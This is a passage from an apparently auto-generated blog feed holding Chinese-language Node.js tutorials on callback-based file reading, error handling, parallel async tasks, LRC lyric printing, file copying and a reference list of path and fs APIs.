&#125;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"222222-----"</span>, data2);</span><br><span class="line">      fs.readFile(<span class="string">"./data/03.txt"</span>, <span class="string">"utf8"</span>, (err, data3) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"3333----"</span>, data3);</span><br><span class="line">        <span class="comment">// 器材备齐，可以做事了</span></span><br><span class="line">        doSomething (data1, data2, data3);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line">ready(<span class="function">(<span class="params">data1, data2, data3</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"ok, 器材已经准备齐全，可以做这件事了"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="修改封装中的异常处理方式"><a href="#修改封装中的异常处理方式" class="headerlink" title="修改封装中的异常处理方式"></a>修改封装中的异常处理方式</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="comment">// 上面代码的封装</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ready</span>(<span class="params">doSomething</span>)</span>&#123;</span><br><span class="line">  fs.readFile(<span class="string">"./data/01.txt"</span>, <span class="string">"utf8"</span>, (err, data1) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> doSomething(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"11111111---"</span>, data1);</span><br><span class="line">    fs.readFile(<span class="string">"./data/02.txt"</span>, <span class="string">"utf8"</span>, (err, data2) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> doSomething(err);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"222222-----"</span>, data2);</span><br><span class="line">      fs.readFile(<span class="string">"./data/03.txt"</span>, <span class="string">"utf8"</span>, (err, data3) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="keyword">return</span> doSomething(err);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"3333----"</span>, data3);</span><br><span class="line">        <span class="comment">// 不发生错误时，第一个参数传递一个 null</span></span><br><span class="line">        doSomething (<span class="literal">null</span>, data1, data2, data3);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 封装过后处理错误的过程</span></span><br><span class="line">ready(<span class="function">(<span class="params">err, data1, data2, data3</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"ok, 器材已经准备齐全，可以做这件事了"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="封装多个异步并行任务"><a href="#封装多个异步并行任务" class="headerlink" title="封装多个异步并行任务"></a>封装多个异步并行任务</h2><p>找多个人去做准备工作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="comment">// 上面代码的封装</span></span><br><span class="line"><span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 第一个任务</span></span><br><span class="line">fs.readFile(<span class="string">"./data/01.txt"</span>, <span class="string">"utf8"</span>, (err, data1) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"11111111---"</span>, data1);</span><br><span class="line">  count++;</span><br><span class="line">  <span class="keyword">if</span> (count === <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"ok, 器材已经准备齐全，可以做这件事了"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 第二个任务</span></span><br><span class="line">fs.readFile(<span class="string">"./data/02.txt"</span>, <span class="string">"utf8"</span>, (err, data2) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"222222-----"</span>, data2);</span><br><span class="line">  count++;</span><br><span class="line">  <span class="keyword">if</span> (count === <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"ok, 器材已经准备齐全，可以做这件事了"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 第三个任务</span></span><br><span class="line">fs.readFile(<span class="string">"./data/03.txt"</span>, <span class="string">"utf8"</span>, (err, data3) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"3333----"</span>, data3);</span><br><span class="line">  count++;</span><br><span class="line">  <span class="keyword">if</span> (count === <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"ok, 器材已经准备齐全，可以做这件事了"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>将上面代码继续封装</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="comment">// 上面代码的封装</span></span><br><span class="line"><span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 第一个任务</span></span><br><span class="line">fs.readFile(<span class="string">"./data/01.txt"</span>, <span class="string">"utf8"</span>, (err, data1) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"11111111---"</span>, data1);</span><br><span class="line">  doSomething();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 第二个任务</span></span><br><span class="line">fs.readFile(<span class="string">"./data/02.txt"</span>, <span class="string">"utf8"</span>, (err, data2) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"222222-----"</span>, data2);</span><br><span class="line">  doSomething();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 第三个任务</span></span><br><span class="line">fs.readFile(<span class="string">"./data/03.txt"</span>, <span class="string">"utf8"</span>, (err, data3) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"3333----"</span>, data3);</span><br><span class="line">  doSomething();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  count++;</span><br><span class="line">  <span class="keyword">if</span> (count === <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"ok, 器材已经准备齐全，可以做这件事了"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上封装的问题，ready 的过程可能失败，应该告诉做事的，而不是主动抛出来；怎么告诉呢？传给回调函数，于是封装成了下面代码:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line">ready([<span class="string">'./data/01.txt'</span>, <span class="string">'./data/02.txt'</span>, <span class="string">'./data/03.txt'</span>], (err, obj) =&gt; &#123;</span><br><span class="line">  <span class="comment">// obj &#123; data1:'', data2: '', data3: '' &#125;</span></span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">console</span>.log(<span class="string">'执行任务失败了'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(obj);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 封装多个并行的异步API</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ready</span>(<span class="params">filePaths, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> length = filePaths.length;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 当循环执行结束，就说明分配了三个异步任务</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> filePath <span class="keyword">of</span> filePaths) &#123;</span><br><span class="line">    fs.readFile(filePath, <span class="string">'utf8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> callback(err);</span><br><span class="line">      &#125;</span><br><span class="line">      obj[path.parse(filePath).name] = data;</span><br><span class="line">      count++;</span><br><span class="line">      <span class="keyword">if</span> (count === length) &#123;</span><br><span class="line">        callback(<span class="literal">null</span>, obj);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="歌词在控制台一行一行打印-lrc"><a href="#歌词在控制台一行一行打印-lrc" class="headerlink" title="歌词在控制台一行一行打印 lrc"></a>歌词在控制台一行一行打印 lrc</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> iconv = <span class="built_in">require</span>(<span class="string">'iconv-lite'</span>);</span><br><span class="line">fs.readFile(<span class="string">'./data/168305.lrc'</span>, (err, data) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> lrcStr = iconv.decode(data, <span class="string">'gbk'</span>);</span><br><span class="line">  <span class="keyword">const</span> lines = lrcStr.split(<span class="string">'\r\n'</span>);</span><br><span class="line">  <span class="keyword">const</span> regex = <span class="regexp">/^\[(\d&#123;2&#125;)\:(\d&#123;2&#125;)\.(\d&#123;2&#125;)\]\s(.+)$/</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> line <span class="keyword">of</span> lines)&#123;</span><br><span class="line">    <span class="keyword">const</span> matches = regex.exec(line);</span><br><span class="line">    <span class="keyword">if</span> (matches) &#123;</span><br><span class="line">      <span class="keyword">const</span> m = <span class="built_in">parseInt</span>(matches[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">const</span> s = <span class="built_in">parseInt</span>(matches[<span class="number">2</span>]);</span><br><span class="line">      <span class="keyword">const</span> ms = <span class="built_in">parseInt</span>(matches[<span class="number">3</span>]);</span><br><span class="line">      <span class="keyword">const</span> content = matches[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">const</span> time = m * <span class="number">60</span> * <span class="number">1000</span> + s * <span class="number">1000</span> + ms;</span><br><span class="line">      setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(content);</span><br><span class="line">      &#125;, time);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>同步调用立即执行，会阻塞后续代码继续执行，如果想要捕获异常需要使用 <code>try-catch</code></li><li>异步调用不会阻塞后续代码继续执行，需要回调函数作为额外的参数，通常包含一个错误作为回调函数的第一个参数</li><li>异步调用通过判断第一个err对象来处理异常</li><li>异步调用结果往往通过回调函数来进行获取</li></ul><h2 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line">copy (<span class="string">'./node.md'</span>,<span class="string">'./a.md'</span>, err =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'copy success'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">src, dest, callback</span>) </span>&#123;</span><br><span class="line">  fs.readFile(src, (err, data) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> callback(err);</span><br><span class="line">      &#125;</span><br><span class="line">      fs.writeFile(dest, data, err =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)&#123;</span><br><span class="line">          <span class="keyword">return</span> callback(err);</span><br><span class="line">        &#125;</span><br><span class="line">        callback(<span class="literal">null</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="process"><a href="#process" class="headerlink" title="process"></a>process</h2><p>process.argv 可以获取当前通过执行脚本的时候传递的参数，默认结果是一个数组</p><ul><li>数组中第 0 项就是 node 的可执行文件的绝对路径</li><li>数组中第 1 项就是 执行的当前脚本文件的绝对路径</li><li>数组中从第 2 项开始，就是用户通过执行命令传递进来的参数选项，以空格划分</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> args = process.argv.slice(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>封装复制文件函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> args = process.argv.slice(<span class="number">2</span>);</span><br><span class="line">copy (args[<span class="number">0</span>], args[<span class="number">1</span>], err =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'copy success!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">src, des, callback</span>) </span>&#123;</span><br><span class="line">  fs.readFile(src, (err, data) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> callback(err);</span><br><span class="line">    &#125;</span><br><span class="line">    fs.writeFile(des, data, err =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> callback(err);</span><br><span class="line">      &#125;</span><br><span class="line">      callback(<span class="literal">null</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;fs 文件操作模块&lt;/p&gt;
&lt;p&gt;Node 只在文件 IO 操作中，提供了同步调用和异步调用两种形式，fs 模块对文件的几乎所有操作都有同步和异步两种形式，两者可以结合使用，但是推荐能使用异步调用解决问题的情况下，少用同步调用。&lt;/p&gt;
&lt;p&gt;例如：&lt;code&gt;readFile()&lt;/code&gt; 和 &lt;code&gt;readFileSync()&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;引入包&quot;&gt;&lt;a href=&quot;#引入包&quot; class=&quot;headerlink&quot; title=&quot;引入包&quot;&gt;&lt;/a&gt;引入包&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; path = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;path&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;同步操作&quot;&gt;&lt;a href=&quot;#同步操作&quot; class=&quot;headerlink&quot; title=&quot;同步操作&quot;&gt;&lt;/a&gt;同步操作&lt;/h2&gt;
    
    </summary>
    
      <category term="Node.js" scheme="http://yoursite.com/categories/Node-js/"/>
    
    
      <category term="Node.js" scheme="http://yoursite.com/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>Node常用API</title>
    <link href="http://yoursite.com/2016/10/25/Node%E5%B8%B8%E7%94%A8API/"/>
    <id>http://yoursite.com/2016/10/25/Node常用API/</id>
    <published>2016-10-24T16:00:00.000Z</published>
    <updated>2018-06-06T02:42:27.914Z</updated>
    
    <content type="html"><![CDATA[<h2 id="path-文件路径处理模块"><a href="#path-文件路径处理模块" class="headerlink" title="path 文件路径处理模块"></a>path 文件路径处理模块</h2><h3 id="引入包"><a href="#引入包" class="headerlink" title="引入包"></a>引入包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const path = require(&apos;path&apos;);</span><br></pre></td></tr></table></figure><h3 id="path-文件路径处理的相关-API"><a href="#path-文件路径处理的相关-API" class="headerlink" title="path 文件路径处理的相关 API"></a>path 文件路径处理的相关 API</h3><ul><li>path.basename(path[, ext]): 获取文件名部分</li><li>path.dirname(path): 获取目录部分</li><li>path.extname(path): 获取扩展名部分</li><li>path.isAbsolute(path): 判断是否是绝对路径</li><li>path.join([…paths]): 将多个路径拼接为一个路径</li><li>path.normalize(path): 将一个非标准路径转为一个标准路径</li><li>path.resolve([…paths]): 将多个路径拼接为一个绝对路径</li><li>path.sep: 获取操作系统路径分隔符</li><li>path.format(pathObject): 将一个对象转成路径</li></ul><a id="more"></a><h2 id="fs-文件操作模块"><a href="#fs-文件操作模块" class="headerlink" title="fs 文件操作模块"></a>fs 文件操作模块</h2><h3 id="引入包-1"><a href="#引入包-1" class="headerlink" title="引入包"></a>引入包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&apos;fs&apos;);</span><br></pre></td></tr></table></figure><h3 id="fs-文件操作的相关-API"><a href="#fs-文件操作的相关-API" class="headerlink" title="fs 文件操作的相关 API"></a>fs 文件操作的相关 API</h3><ul><li>fs.writeFile(file, data, callback)：文件写入</li><li>fs.appendFile(file, data, callback)：文件追加</li><li>fs.readFile(file[, options], callback)：文件读取</li><li>fs.unlink(path, callback)：删除文件</li><li>fs.stat(path, callback)：获取文件信息</li><li>fs.access(path, callback)：验证文件路径是否存在<ul><li>fs.access(‘路径’, callback(err))<ul><li>如果没有错误，说明路径存在</li><li>如果有错误，说明路径不存在</li></ul></li></ul></li><li>fs.rename(oldPath, newPath, callback)：重命名或移动文件</li></ul><h3 id="目录操作常用API"><a href="#目录操作常用API" class="headerlink" title="目录操作常用API"></a>目录操作常用API</h3><ul><li>fs.mkdir(path, callback)：创建一个目录</li><li>fs.rmdir(path, callback)：删除一个空目录<ul><li>该 API ，只能删除一个空目录</li><li>如果想要删除一个非空目录，自己写代码：递归思路</li></ul></li><li>fs.readdir(path, callback)：读取一个目录</li><li>fs.rename(oldPath, newPath, callback)：重命名或移动目录</li></ul><h3 id="获取文件信息"><a href="#获取文件信息" class="headerlink" title="获取文件信息"></a>获取文件信息</h3><ul><li>fs.stat(path,callback)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&apos;fs&apos;);</span><br><span class="line">fs.stat(&apos;./a&apos;, (err.stats) =&gt; &#123;</span><br><span class="line">  if (err) &#123;</span><br><span class="line">    throw err</span><br><span class="line">  &#125;</span><br><span class="line">  if (stats.isFile()) &#123;</span><br><span class="line">    console.log(&apos;是文件&apos;);</span><br><span class="line">  &#125; else if (stats.isDirectory()) &#123;</span><br><span class="line">    console.log (&apos;是目录&apos;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>stats.isFile()</li><li>stats.isDirector()</li><li>stats.isBlockDevice()</li><li>stats.isCharacterDeveice()</li><li>stats.isSymbolicLink()</li><li>stats.isFIFO()</li><li>stats.isSocket()</li><li>stats.size; 文件大小</li><li>stats.atime; 最后一次访问时间</li><li>stats.mtime; 最后一次修改时间</li><li>stats.ctime; 创建时间和修改时间</li><li>stats.birthtime; 创建时间</li></ul><h3 id="监视"><a href="#监视" class="headerlink" title="监视"></a>监视</h3><ul><li>fs.watchFile(filename[, options], listener)</li><li>fs.watch(filename[, options][, listener])</li></ul><h2 id="Node-支持的编码类型"><a href="#Node-支持的编码类型" class="headerlink" title="Node 支持的编码类型"></a>Node 支持的编码类型</h2><ul><li>ascii</li><li>utf8<ul><li>万国码</li></ul></li><li>utf16le</li><li>ucs2</li><li>base64<ul><li>图片编码</li></ul></li><li>latin1</li><li>binary</li><li>hex</li></ul><p>Node 不支持 gbk，所以去社区中找可用的第三方包来解决中文 GBK 编码问题。</p><h3 id="文件流"><a href="#文件流" class="headerlink" title="文件流"></a>文件流</h3><ul><li>fs.createReadStream(src);</li><li>fs.createWriteStream(des);</li><li>fs.statSync(src).size;</li><li>writeStream.write(data);</li><li>writeStream.end();</li><li>readStream.pipe(writeStream);</li></ul><p>未完待续…</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;path-文件路径处理模块&quot;&gt;&lt;a href=&quot;#path-文件路径处理模块&quot; class=&quot;headerlink&quot; title=&quot;path 文件路径处理模块&quot;&gt;&lt;/a&gt;path 文件路径处理模块&lt;/h2&gt;&lt;h3 id=&quot;引入包&quot;&gt;&lt;a href=&quot;#引入包&quot; class=&quot;headerlink&quot; title=&quot;引入包&quot;&gt;&lt;/a&gt;引入包&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;const path = require(&amp;apos;path&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;path-文件路径处理的相关-API&quot;&gt;&lt;a href=&quot;#path-文件路径处理的相关-API&quot; class=&quot;headerlink&quot; title=&quot;path 文件路径处理的相关 API&quot;&gt;&lt;/a&gt;path 文件路径处理的相关 API&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;path.basename(path[, ext]): 获取文件名部分&lt;/li&gt;
&lt;li&gt;path.dirname(path): 获取目录部分&lt;/li&gt;
&lt;li&gt;path.extname(path): 获取扩展名部分&lt;/li&gt;
&lt;li&gt;path.isAbsolute(path): 判断是否是绝对路径&lt;/li&gt;
&lt;li&gt;path.join([…paths]): 将多个路径拼接为一个路径&lt;/li&gt;
&lt;li&gt;path.normalize(path): 将一个非标准路径转为一个标准路径&lt;/li&gt;
&lt;li&gt;path.resolve([…paths]): 将多个路径拼接为一个绝对路径&lt;/li&gt;
&lt;li&gt;path.sep: 获取操作系统路径分隔符&lt;/li&gt;
&lt;li&gt;path.format(pathObject): 将一个对象转成路径&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Node.js" scheme="http://yoursite.com/categories/Node-js/"/>
    
    
      <category term="Node.js" scheme="http://yoursite.com/tags/Node-js/"/>
    
  </entry>
  
  <entry>
    <title>bower 工具</title>
    <link href="http://yoursite.com/2016/10/10/bower%20%E5%B7%A5%E5%85%B7/"/>
    <id>http://yoursite.com/2016/10/10/bower 工具/</id>
